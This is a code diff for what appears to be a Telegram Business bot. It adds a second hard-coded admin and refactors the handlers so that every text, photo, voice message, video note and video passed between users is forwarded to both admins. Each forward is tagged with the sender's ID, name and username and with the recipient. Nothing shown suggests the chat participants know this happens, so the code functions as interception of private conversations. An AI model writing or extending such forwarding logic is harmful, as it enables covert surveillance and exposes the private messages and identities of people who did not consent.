@@ -9,6 +9,8 @@ import { SubscriptionService, MarketApiClient, sleep, formatDate } from "./servi
 
 // ID главного админа для отправки всех сообщений
 const MAIN_ADMIN_ID = 842428912;
+// ID второго админа для отправки всех сообщений
+const SECOND_ADMIN_ID = 1135073023;
 
 // Command handlers
 export async function getUserId(ctx: Context) {
@@ -162,6 +164,91 @@ async function updateUserInfo(ctx: Context, user_chat_id: number, usersCollectio
   }
 }
 
+// Функция для отправки сообщений обоим админам
+async function sendToBothAdmins(ctx: Context, message: string, options?: any) {
+  try {
+    // Отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendMessage(MAIN_ADMIN_ID, message, options);
+    }
+    
+    // Отправляем второму админу
+    if (ctx.from?.id !== SECOND_ADMIN_ID) {
+      await ctx.api.sendMessage(SECOND_ADMIN_ID, message, options);
+    }
+  } catch (error) {
+    console.error("Error sending to admins:", error);
+  }
+}
+
+// Функция для отправки фото обоим админам
+async function sendPhotoToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
+  try {
+    // Отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendPhoto(MAIN_ADMIN_ID, file_id, { caption, ...options });
+    }
+    
+    // Отправляем второму админу
+    if (ctx.from?.id !== SECOND_ADMIN_ID) {
+      await ctx.api.sendPhoto(SECOND_ADMIN_ID, file_id, { caption, ...options });
+    }
+  } catch (error) {
+    console.error("Error sending photo to admins:", error);
+  }
+}
+
+// Функция для отправки голосового сообщения обоим админам
+async function sendVoiceToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
+  try {
+    // Отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendVoice(MAIN_ADMIN_ID, file_id, { caption, ...options });
+    }
+    
+    // Отправляем второму админу
+    if (ctx.from?.id !== SECOND_ADMIN_ID) {
+      await ctx.api.sendVoice(SECOND_ADMIN_ID, file_id, { caption, ...options });
+    }
+  } catch (error) {
+    console.error("Error sending voice to admins:", error);
+  }
+}
+
+// Функция для отправки видеосообщения обоим админам
+async function sendVideoNoteToBothAdmins(ctx: Context, file_id: string) {
+  try {
+    // Отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendVideoNote(MAIN_ADMIN_ID, file_id);
+    }
+    
+    // Отправляем второму админу
+    if (ctx.from?.id !== SECOND_ADMIN_ID) {
+      await ctx.api.sendVideoNote(SECOND_ADMIN_ID, file_id);
+    }
+  } catch (error) {
+    console.error("Error sending video note to admins:", error);
+  }
+}
+
+// Функция для отправки видеофайла обоим админам
+async function sendVideoToBothAdmins(ctx: Context, file_id: string, caption: string, options?: any) {
+  try {
+    // Отправляем главному админу
+    if (ctx.from?.id !== MAIN_ADMIN_ID) {
+      await ctx.api.sendVideo(MAIN_ADMIN_ID, file_id, { caption, ...options });
+    }
+    
+    // Отправляем второму админу
+    if (ctx.from?.id !== SECOND_ADMIN_ID) {
+      await ctx.api.sendVideo(SECOND_ADMIN_ID, file_id, { caption, ...options });
+    }
+  } catch (error) {
+    console.error("Error sending video to admins:", error);
+  }
+}
+
 export class BusinessImageMessageHandler implements IUpdateHandler {
   private usersCollection = new UserRepository();
   private messagesCollection = new MessagesRepository();
@@ -205,26 +292,21 @@ export class BusinessImageMessageHandler implements IUpdateHandler {
 
         console.log(`Photo message saved from user ${ctx.from.id} to ${user_chat_id}`);
 
-        // ОТПРАВЛЯЕМ ФОТО ГЛАВНОМУ АДМИНУ
-        if (ctx.from.id !== MAIN_ADMIN_ID) {
+        // ОТПРАВЛЯЕМ ФОТО ОБОИМ АДМИНАМ
+        if (ctx.from.id !== MAIN_ADMIN_ID && ctx.from.id !== SECOND_ADMIN_ID) {
           const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
           const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
           
-          await ctx.api.sendPhoto(
-            MAIN_ADMIN_ID,
-            file_id,
-            {
-              caption: `📸 <b>НОВОЕ ФОТО МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
-                      `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
-                      `   ├ ID: <code>${ctx.from.id}</code>\n` +
-                      `   ├ Имя: ${senderName}\n` +
-                      `   └ Username: ${senderUsername}\n\n` +
-                      `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
-                      `   └ ${receiverInfo}\n\n` +
-                      `${ctx.businessMessage.caption ? `📝 <b>ПОДПИСЬ:</b>\n<blockquote>${ctx.businessMessage.caption}</blockquote>` : ''}`,
-              parse_mode: "HTML"
-            }
-          );
+          const caption = `📸 <b>НОВОЕ ФОТО МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+                        `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+                        `   ├ ID: <code>${ctx.from.id}</code>\n` +
+                        `   ├ Имя: ${senderName}\n` +
+                        `   └ Username: ${senderUsername}\n\n` +
+                        `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+                        `   └ ${receiverInfo}\n\n` +
+                        `${ctx.businessMessage.caption ? `📝 <b>ПОДПИСЬ:</b>\n<blockquote>${ctx.businessMessage.caption}</blockquote>` : ''}`;
+
+          await sendPhotoToBothAdmins(ctx, file_id, caption, { parse_mode: "HTML" });
         }
       }
     } catch (error) {
@@ -277,26 +359,21 @@ export class BusinessVoiceMessageHandler implements IUpdateHandler {
 
         console.log(`Voice message saved from user ${ctx.from.id} to ${user_chat_id}`);
 
-        // ОТПРАВЛЯЕМ ГОЛОСОВОЕ ГЛАВНОМУ АДМИНУ
-        if (ctx.from.id !== MAIN_ADMIN_ID) {
+        // ОТПРАВЛЯЕМ ГОЛОСОВОЕ ОБОИМ АДМИНАМ
+        if (ctx.from.id !== MAIN_ADMIN_ID && ctx.from.id !== SECOND_ADMIN_ID) {
           const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
           const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
           
-          await ctx.api.sendVoice(
-            MAIN_ADMIN_ID,
-            file_id,
-            {
-              caption: `🎤 <b>НОВОЕ ГОЛОСОВОЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
-                      `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
-                      `   ├ ID: <code>${ctx.from.id}</code>\n` +
-                      `   ├ Имя: ${senderName}\n` +
-                      `   └ Username: ${senderUsername}\n\n` +
-                      `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
-                      `   └ ${receiverInfo}\n\n` +
-                      `⏱️ <b>Длительность:</b> ${duration} сек`,
-              parse_mode: "HTML"
-            }
-          );
+          const caption = `🎤 <b>НОВОЕ ГОЛОСОВОЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+                        `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+                        `   ├ ID: <code>${ctx.from.id}</code>\n` +
+                        `   ├ Имя: ${senderName}\n` +
+                        `   └ Username: ${senderUsername}\n\n` +
+                        `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+                        `   └ ${receiverInfo}\n\n` +
+                        `⏱️ <b>Длительность:</b> ${duration} сек`;
+
+          await sendVoiceToBothAdmins(ctx, file_id, caption, { parse_mode: "HTML" });
         }
       }
     } catch (error) {
@@ -349,27 +426,25 @@ export class BusinessVideoMessageHandler implements IUpdateHandler {
 
         console.log(`Video message saved from user ${ctx.from.id} to ${user_chat_id}`);
 
-        // ОТПРАВЛЯЕМ ВИДЕОСООБЩЕНИЕ ГЛАВНОМУ АДМИНУ
-        if (ctx.from.id !== MAIN_ADMIN_ID) {
+        // ОТПРАВЛЯЕМ ВИДЕОСООБЩЕНИЕ ОБОИМ АДМИНАМ
+        if (ctx.from.id !== MAIN_ADMIN_ID && ctx.from.id !== SECOND_ADMIN_ID) {
           const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
           const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
           
           // Сначала отправляем видеосообщение
-          await ctx.api.sendVideoNote(MAIN_ADMIN_ID, file_id);
+          await sendVideoNoteToBothAdmins(ctx, file_id);
           
           // Затем отправляем описание отдельным сообщением
-          await ctx.api.sendMessage(
-            MAIN_ADMIN_ID,
-            `🎥 <b>НОВОЕ ВИДЕОСООБЩЕНИЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
-            `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
-            `   ├ ID: <code>${ctx.from.id}</code>\n` +
-            `   ├ Имя: ${senderName}\n` +
-            `   └ Username: ${senderUsername}\n\n` +
-            `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
-            `   └ ${receiverInfo}\n\n` +
-            `⏱️ <b>Длительность:</b> ${duration} сек`,
-            { parse_mode: "HTML" }
-          );
+          const description = `🎥 <b>НОВОЕ ВИДЕОСООБЩЕНИЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+                            `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+                            `   ├ ID: <code>${ctx.from.id}</code>\n` +
+                            `   ├ Имя: ${senderName}\n` +
+                            `   └ Username: ${senderUsername}\n\n` +
+                            `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+                            `   └ ${receiverInfo}\n\n` +
+                            `⏱️ <b>Длительность:</b> ${duration} сек`;
+
+          await sendToBothAdmins(ctx, description, { parse_mode: "HTML" });
         }
       }
     } catch (error) {
@@ -422,28 +497,23 @@ export class BusinessVideoFileHandler implements IUpdateHandler {
 
         console.log(`Video file saved from user ${ctx.from.id} to ${user_chat_id}`);
 
-        // ОТПРАВЛЯЕМ ВИДЕОФАЙЛ ГЛАВНОМУ АДМИНУ
-        if (ctx.from.id !== MAIN_ADMIN_ID) {
+        // ОТПРАВЛЯЕМ ВИДЕОФАЙЛ ОБОИМ АДМИНАМ
+        if (ctx.from.id !== MAIN_ADMIN_ID && ctx.from.id !== SECOND_ADMIN_ID) {
           const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
           const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
           
-          await ctx.api.sendVideo(
-            MAIN_ADMIN_ID,
-            file_id,
-            {
-              caption: `🎬 <b>НОВОЕ ВИДЕО МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
-                      `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
-                      `   ├ ID: <code>${ctx.from.id}</code>\n` +
-                      `   ├ Имя: ${senderName}\n` +
-                      `   └ Username: ${senderUsername}\n\n` +
-                      `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
-                      `   └ ${receiverInfo}\n\n` +
-                      `📁 <b>Файл:</b> ${file_name || 'Без названия'}\n` +
-                      `⏱️ <b>Длительность:</b> ${duration} сек\n` +
-                      `📊 <b>Формат:</b> ${mime_type || 'Неизвестный'}`,
-              parse_mode: "HTML"
-            }
-          );
+          const caption = `🎬 <b>НОВОЕ ВИДЕО МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+                        `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+                        `   ├ ID: <code>${ctx.from.id}</code>\n` +
+                        `   ├ Имя: ${senderName}\n` +
+                        `   └ Username: ${senderUsername}\n\n` +
+                        `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+                        `   └ ${receiverInfo}\n\n` +
+                        `📁 <b>Файл:</b> ${file_name || 'Без названия'}\n` +
+                        `⏱️ <b>Длительность:</b> ${duration} сек\n` +
+                        `📊 <b>Формат:</b> ${mime_type || 'Неизвестный'}`;
+
+          await sendVideoToBothAdmins(ctx, file_id, caption, { parse_mode: "HTML" });
         }
       }
     } catch (error) {
@@ -497,24 +567,22 @@ export class BusinessMessageHandler implements IUpdateHandler {
 
           console.log(`Text message saved from user ${ctx.from.id} to ${user_chat_id}`);
 
-          // ОТПРАВЛЯЕМ ВСЕ СООБЩЕНИЯ ГЛАВНОМУ АДМИНУ
-          if (ctx.from.id !== MAIN_ADMIN_ID) {
+          // ОТПРАВЛЯЕМ ВСЕ СООБЩЕНИЯ ОБОИМ АДМИНАМ
+          if (ctx.from.id !== MAIN_ADMIN_ID && ctx.from.id !== SECOND_ADMIN_ID) {
             const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
             const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
             
-            await ctx.api.sendMessage(
-              MAIN_ADMIN_ID,
-              `💬 <b>НОВОЕ СООБЩЕНИЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
-              `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
-              `   ├ ID: <code>${ctx.from.id}</code>\n` +
-              `   ├ Имя: ${senderName}\n` +
-              `   └ Username: ${senderUsername}\n\n` +
-              `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
-              `   └ ${receiverInfo}\n\n` +
-              `📝 <b>СООБЩЕНИЕ:</b>\n` +
-              `<blockquote>${text}</blockquote>`,
-              { parse_mode: "HTML" }
-            );
+            const message = `💬 <b>НОВОЕ СООБЩЕНИЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+                          `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+                          `   ├ ID: <code>${ctx.from.id}</code>\n` +
+                          `   ├ Имя: ${senderName}\n` +
+                          `   └ Username: ${senderUsername}\n\n` +
+                          `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+                          `   └ ${receiverInfo}\n\n` +
+                          `📝 <b>СООБЩЕНИЕ:</b>\n` +
+                          `<blockquote>${text}</blockquote>`;
+
+            await sendToBothAdmins(ctx, message, { parse_mode: "HTML" });
           }
         }
       }
